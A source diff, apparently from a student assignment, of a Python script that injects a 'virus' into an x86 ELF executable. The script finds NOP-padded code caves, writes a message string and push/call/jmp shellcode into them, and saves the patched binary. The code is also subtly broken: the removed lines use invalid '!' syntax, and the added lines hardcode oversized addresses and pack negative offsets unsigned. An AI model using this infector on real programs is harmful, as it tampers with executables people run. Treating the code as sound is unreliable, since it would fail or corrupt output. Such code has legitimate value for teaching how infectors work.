@@ -1,12 +1,16 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# Path: HW3\mod.py
 
 TARGET_FILE = 'target.exe'
 NEW_TARGET_FILE = 'target.h@kd.exe'
-PRINT_FORMAT = b'%s\0'
-TEXT_PRINT = b'Wahoo virus infection!\r\n\0'
+TEXT = b'Wahoo virus infection!\0'
 BASE_ADDR = 0x08048000 # Default entry point for an x86 ELF file
+PUTS_ADDR = 0x1080482e0 # Location of the puts function in the target file with a twist
+JUMP_ADDR = 0x10804844e # Location of the main code in the target file with a twist
+PUSH = b'\x68'
+CALL = b'\xe8'
+JMP = b'\xe9'
+RETURN = b'\xc9\xc3'
 
 def main():
 	data = b''
@@ -17,68 +21,70 @@ def main():
 	if data[0:4] != b'\x7fELF':
 		print('Not an ELF file')
 		exit(1)
-	in_sequence = False
-	leave_found = False
-	zero_found = False
-	code_found = False
-	jump_found = False
-	string_found = False
-	zero_count = 0
+
+	# Go through the bytes and find the leave + ret + nop instruction pattern
+	# A smaller pattern will be used for the tricky jump whereas
+	# a larger pattern will be used for the code injection
+	smaller_pattern = -1
+	larger_pattern = -1
 	nop_count = 0
-	jump_offset = -1
-	code_offset = -1
-	string_offset = -1
-	# Loop through the bytes and find a return opcode with 4 bytes of NOPs
+	leave_found = False
+	ret_found = False
+	in_sequence = False
 	for i in range(len(data)):
-		if in_sequence:
+		if data[i] == 0xc9:
+			leave_found = True
+		elif data[i] == 0xc3 and leave_found:
+			ret_found = True
+		elif data[i] == 0x90 and ret_found:
+			in_sequence = True
+			nop_count+= 1
+		elif in_sequence:
 			if data[i] == 0x90:
-				nop_count += 1
-			elif data[i] == 0x00:
-				zero_count += 1
-			elif nop_count >= 15 and !code_found:
-				code_offset = i - nop_count + 1
-				code_found = True
-				nop_count = 0
-			elif nop_count >= 5 and !jump_found:
-				jump_offset = i - nop_count - 1
-				jump_found = True
-				nop_count = 0
-			elif zero_count >= 24 and !string_found:
-				string_offset = i - zero_count + 1
-				string_found = True
-				zero_count = 0
-			else:
-				in_sequence = False
-				nop_count = 0
-		else:
-			if data[i] == 0xC9: # Find the leave opcode
-				leave_found = True
-			elif data[i] == 0xC3 and leave_found: # Find the return opcode
-				in_sequence = True
-				leave_found = False
-			elif data[i] == 0x00: # Find the zero opcode
-				in_sequence = True
-	# Now that a suitable place has been found, save the offset to save the jump opcode
-	if jump_offset == -1 or code_offset == -1 or string_offset == -1:
-		print('Could not find a suitable place to insert the virus')
+				nop_count+= 1
+				continue
+			elif nop_count >= 40 and larger_pattern == -1:
+				larger_pattern = i - nop_count
+			elif nop_count >= 4 and smaller_pattern == -1:
+				smaller_pattern = i - nop_count - 2
+			leave_found = False
+			ret_found = False
+			in_sequence = False
+			nop_count = 0
+
+	# Check if the patterns were found
+	if smaller_pattern == -1 or larger_pattern == -1:
+		print('Appropriate nop sled(s) not found; cannot inject virus into the executable')
 		exit(1)
-	else:
-		print(f"Found offsets.\r\nJump: {hex(jump_offset)}\r\nCode: {hex(code_offset)}\r\nString: {hex(string_offset)}")
-	jump_offset += BASE_ADDR
-	code_offset += BASE_ADDR
-	string_offset += BASE_ADDR
-	# Now that the offset has been found, insert the virus
-	# # Insert the jump opcode
-	data = data[:jump_offset] + b'\xE9' + (code_offset).to_bytes(4, 'little') + data[jump_offset + 5:]
-	# Insert TEXT_PRINT in place of the zeros
-	data = data[:string_offset] + TEXT_PRINT + data[string_offset + len(TEXT_PRINT):]
-	string_offset+= len(TEXT_PRINT)
-	# Insert the PRINT_FORMAT next to the TEXT_PRINT
-	data = data[:string_offset] + PRINT_FORMAT + data[string_offset + len(PRINT_FORMAT):]
-	# The code will push the string offset onto the stack, then the print format, then call printf and return
-	code = b'\x06' + (string_offset).to_bytes(4, 'little') + b'\x06' + PRINT_FORMAT + b'\x9A\x70\x72\x69\x6E\x74\x66\xC3\xC9'
-	# Insert the code
-	data = data[:code_offset] + code + data[code_offset + len(code):]
+
+	# Print the addresses of the patterns
+	print(f'Smaller nop sled found at: {smaller_pattern}')
+	print(f'Larger nop sled found at: {larger_pattern}')
+
+	# Inject the larger pattern first as we will need its offset for the smaller pattern
+	# The larger pattern will be used to print a message to the console
+	# Inject the string to be printed into the executable
+	data = data[:larger_pattern + 16] + TEXT + data[larger_pattern + 16 + len(TEXT):]
+	# Move the larger pattern offset to the end of the string
+	string_offset = larger_pattern + 16 + BASE_ADDR
+	string_offset_bytes = string_offset.to_bytes(4, 'little')
+	eip = larger_pattern + BASE_ADDR + len(PUSH) + len(string_offset_bytes) + len(CALL) + 4
+	# Calculate the offset to the puts function
+	offset = PUTS_ADDR - eip
+	offset_bytes = offset.to_bytes(4, 'little')
+	big_code = PUSH + string_offset_bytes + CALL + offset_bytes + RETURN
+	print(f"Virus payload: {big_code}")
+	# Inject the code to push the string offset onto the stack, then the address of puts, and then leave and return
+	data = data[:larger_pattern] + big_code + data[larger_pattern + len(big_code):]
+
+	# In the smaller pattern, we will jump to the larger pattern
+	eip = smaller_pattern + BASE_ADDR + len(JMP) + 4
+	# Calculate the offset to the larger pattern
+	offset = JUMP_ADDR - eip
+	offset_bytes = offset.to_bytes(4, 'little')
+	small_code = JMP + offset_bytes
+	print(f"Jump payload: {small_code}")
+	data = data[:smaller_pattern] + small_code + data[smaller_pattern + len(small_code):]
 
 	# Write the bytes to the target file
 	with open(NEW_TARGET_FILE, 'wb') as f:
